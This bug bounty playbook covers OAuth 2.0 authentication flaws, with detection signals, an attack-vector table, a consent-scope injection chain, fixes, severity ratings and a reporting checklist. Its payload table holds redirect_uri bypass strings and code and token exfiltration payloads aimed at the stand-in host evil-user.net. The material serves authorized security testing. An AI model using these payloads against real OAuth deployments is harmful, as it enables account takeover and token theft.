# OAuth 2.0 — Bug Bounty Playbook

> Source: PortSwigger Web Security Academy — "OAuth 2.0 authentication vulnerabilities" (+ Hidden OAuth Attack Vectors research).
> Flows: **authorization code** (code via browser → token on server back-channel) vs **implicit** (all in browser; token in URL fragment, JS-read, often POSTed & implicitly trusted). Loose spec, most security optional ⇒ misconfig-rich.

## 1. Quick Detection
- "Log in with X" option → proxy through Burp, replay full flow.
- First flow request always hits the OAuth server's `/authorization` endpoint:
`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24`

| Signal | Meaning |
|---|---|
| `response_type=code` / `=token` | authorization code flow / implicit flow (juicier — token via browser) |
| `scope=openid …` | OpenID Connect layer present |
| missing/weak `state` | CSRF candidate for login/linking |
| provider hostname | read provider docs: endpoint names + config |

- Recon: fetch `/.well-known/oauth-authorization-server` + `/.well-known/openid-configuration` → JSON config exposes undocumented endpoints/features (wider surface); issuer/`request_uri` URLs = SSRF pivots.
- OIDC: probe dynamic client registration (registration_endpoint). Unprotected = register own client app.
- Enumerate accepted `redirect_uri` values: strip/add paths, queries, fragments; map validation.

## 2. Attack Vectors

| # | Vector | Technique |
|---|---|---|
| A1 | redirect_uri bypass | See §3 table: prefix-match abuse, parser confusion, dup params, localhost, response_mode tricks |
| A2 | ATO via subdomain redirect | Validation allows `*.client-app.com`; take over a subdomain → host page capturing code/token |
| A3 | Missing `state` → CSRF | Attacker starts flow, victim's browser completes it. (a) Linking hijack: site has password login + social linking → victim's account bound to attacker's social account. (b) Login CSRF: victim logged into attacker's account |
| A4 | Code interception | Steal victim's code pre-use → send to legit `/callback`; client completes exchange, logs attacker into victim's acct. state/nonce useless (attacker mints own). Blocked only if exchange re-checks redirect_uri |
| A5 | Implicit param swap | Client POSTs `{email/user_id, access_token}` from browser and trusts it (no secret to verify) → swap identity, keep valid token ⇒ impersonate any user |
| A6 | Steal via proxy page | No external redirect_uri? Traversal `/oauth/callback/../../any/path` → any whitelisted-domain page. Audit it for: open redirect (fwd victim+code/token out), XSS (code/token = own session, outlasts tab, bypasses HttpOnly), JS/web-messaging on query/fragment (gadget chains), HTML injection → `<img src="evil-user.net">` leaks Referer w/ query string (Firefox) = JS-free code theft |
| A7 | Implicit token leakage | Need fragment extractor (open redirect can't read fragment). Stolen token ⇒ direct API calls to `/userinfo`/resource server — data beyond client UI |
| A8 | Scope upgrade — code flow | Register malicious client, request `openid email`; at `POST /token` append `scope=openid%20email%20profile` → upgraded token if server doesn't validate vs initial authz request |
| A9 | Scope upgrade — implicit | Steal token from innocent client → browser request to `/userinfo` with added `scope` param; works while ≤ client's granted access |
| A10 | Unverified registration | Provider skips email verification → register with victim's known email; client maps by email ⇒ login as victim |
| A11 | Access control / config | `.well-known` disclosure; authz requests by reference — `request_uri`/issuer URLs fetched server-side → SSRF |
| A12 | **Consent-screen scope injection** | The consent page takes the granted permission list from the SUBMITTED FORM and forwards it to the OAuth server without checking it against the app's requested scopes → add a hidden `grant_scope` field (e.g. `admin`) and the server mints a token carrying it. See §2b — highest-value modern OAuth class. |
| A13 | **Audience (`aud`) never enforced** | The gatekeeper in front of a privileged backend accepts ANY live token (introspection-only authenticator + `allow` authorizer) and copies the token's self-declared scopes into the upstream credential. Fix = require an `aud` issued only for that backend. |

### 2b. Consent-screen scope injection (the "3-layer permission confusion" chain)

The chain that turned one free account into admin (Blink/Galoy; exploitable ~3 yrs; 6.6 BTC stolen).
Each layer is unremarkable alone — that is why it survived.

1. **Consent page trusts the browser.** The server action reads granted scopes from the form
   (`form.getAll("grant_scope")`) and calls `acceptOAuth2ConsentRequest({ grant_scope: <form value> })`
   WITHOUT validating against `getOAuth2ConsentRequest().requested_scope`. A rendered checkbox and a
   hidden input are the same thing on the wire — a field with `value=admin` is submitted like any other.
2. **The gatekeeper trusts any token.** e.g. Ory Oathkeeper rule for the admin upstream:
   `authenticators: [oauth2_introspection]` (checks only that the token is live), `authorizer: allow`,
   mutator `id_token` copying `{{ .Extra.scope }}`. No `target_audience`.
3. **The backend trusts the copied scope string.** "If the string says `admin`, you are admin."

**Test order:** (a) request the escalated scope at `/oauth2/auth` — a hardened server answers
`error=invalid_scope` and the "obvious route" dies there; (b) if (a) is rejected, the **consent page is
the remaining gate** — after login, replay the consent POST / Next.js Server-Action with an injected
scope field; (c) with any token in hand, replay it at the privileged API and watch for a missing `aud`.

**Controls that kill the chain:** consent validates `grant_scope` ⊆ `requested_scope`; privileged
acceptors require an `aud` only that backend's issuer mints; the backend re-checks the subject against a
known-admin list instead of reading the permission out of the token.

**Getting a `client_id` to start the flow:** a downstream web app in the same estate hands you one —
see `security-recon` Step 5c (NextAuth `/api/auth/signin/<provider>` → 302 `Location` to the authorize URL).

## 3. Payload / Bypass Table

| Bypass | Payload |
|---|---|
| Prefix/startswith check | `https://client-app.com/callback@evil-user.net` or arbitrary path/query/fragment appended to approved prefix |
| Path traversal | `https://client-app.com/oauth/callback/../../example/path` |
| Parser confusion (list-append) | `https://default-host.com&@foo.evil-user.net#@bar.evil-user.net/` |
| Param pollution | `?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net` |
| localhost dev trust | register `localhost.evil-user.net` |
| response_mode shift | `response_mode=fragment` (changes redirect_uri parsing) / `web_message` (often allows wider subdomains) |
| Code exfil (no JS) | injected `<img src="https://evil-user.net">` on page receiving code → Referer leak |
| Token exfil | open redirect/JS relay: `…/rd?u=https://evil-user.net` reading `location.hash` |

Combine parameter changes — altering one can change how others are validated.

## 4. By-Design Filters (SKIP)
- `state` session-bound + validated server-side.
- Exact-match redirect_uri whitelist, re-checked at token exchange (back-channel).
- PKCE/nonce enforced.
- Implicit POST: token cryptographically verified against submitted identity.
- Provider verifies emails; account linking requires password re-auth.
- Consent endpoint validates `grant_scope` ⊆ `requested_scope` (silently-added scopes rejected).
- Privileged API requires an `aud` minted only for it — token introspection alone is NOT an audience check, and the `scope` in the introspection response is the token's own claim, not a permission grant.

## 5. Severity Guide

| Finding | Severity |
|---|---|
| ATO via redirect_uri bypass / implicit param swap / subdomain redirect | Critical |
| Code/token theft via open redirect, XSS relay, Referer leak | High |
| Account-linking CSRF (missing state) | High |
| Unverified email registration → ATO | High |
| Scope upgrade (either flow) | Medium |
| Login CSRF only | Low–Medium |
| Config/endpoint disclosure via `.well-known` | Info–Low |

## 6. Reporting Checklist
- [ ] Flow type (code vs implicit) + grant-specific impact
- [ ] Full request/response chain, every modified parameter
- [ ] Proven impact in YOUR browser (login as victim / read data) — screenshots, not theory
- [ ] Which protection failed & why (state? exchange redirect check?)
- [ ] Fix: exact-match whitelist, state+PKCE, exchange-time redirect_uri check, verified emails, token-vs-identity validation
- [ ] Own test accounts only; stop at proof of impact

> ⚠️ Blocked/unproven exploit chain = INFORMATIONAL per master KB rule. Never claim HIGH/CRIT from theory alone.
